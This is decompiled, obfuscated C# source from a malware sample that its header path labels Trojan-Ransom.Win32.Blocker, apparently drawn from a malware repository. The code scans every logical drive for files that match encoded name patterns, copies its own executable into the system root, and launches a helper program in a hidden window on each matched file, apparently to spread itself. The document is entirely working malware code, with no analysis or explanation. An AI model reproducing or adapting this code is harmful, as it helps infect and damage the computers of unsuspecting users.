// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2EAA04FB-4A12-46FB-89C9-8F20DEF80030
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.heqk-a676fa6fd1e5c420949ebe87d886c57cc8693a1c182562bacd2c8a70cf0dc574.exe

using \u0003;
using \u0005;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0005
{
  internal class \u001A
  {
    private static string \u0001;

    [DllImport("kernel32.dll", EntryPoint = "GetShortPathName", CharSet = CharSet.Auto)]
    private static extern int \u0003\u0002([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, [In] int obj2);

    private static void \u0004\u0002([In] string obj0)
    {
      try
      {
        foreach (string file in Directory.GetFiles(obj0))
        {
          if (file.Contains(\u0002.\u001C(1532)))
            \u001A.\u0006\u0002(file);
          if (file.Contains(\u0002.\u001C(1541)))
            \u001A.\u0006\u0002(file);
        }
        foreach (string directory in Directory.GetDirectories(obj0))
          \u001A.\u0004\u0002(directory);
      }
      catch
      {
      }
    }

    public static void \u0005\u0002()
    {
      try
      {
        \u001A.\u0001 = Process.GetCurrentProcess().MainModule.FileName;
        foreach (string logicalDrive in Environment.GetLogicalDrives())
          \u001A.\u0004\u0002(logicalDrive);
      }
      catch
      {
      }
    }

    private static void \u0006\u0002([In] string obj0)
    {
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
        string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf(\u0002.\u001C(238))), string.Empty) + \u0002.\u001C(238);
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0002.\u001C(1550);
        if (!File.Exists(path))
          return;
        if (!File.Exists(Path.Combine(path1, \u001A.\u0001)))
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, \u001A.\u0001));
        StringBuilder shortPath1 = new StringBuilder((int) byte.MaxValue);
        \u001A.\u0003\u0002(Path.Combine(path1, \u001A.\u0001), shortPath1, shortPath1.Capacity);
        StringBuilder shortPath2 = new StringBuilder((int) byte.MaxValue);
        \u001A.\u0003\u0002(obj0, shortPath2, shortPath2.Capacity);
        try
        {
          ProcessStartInfo startInfo = new ProcessStartInfo();
          string str = \u0002.\u001C(1575) + shortPath2.ToString() + \u0002.\u001C(1104) + shortPath1.ToString();
          startInfo.FileName = path;
          startInfo.Arguments = str;
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          Process.Start(startInfo);
        }
        catch
        {
        }
      }
      catch
      {
      }
    }
  }
}
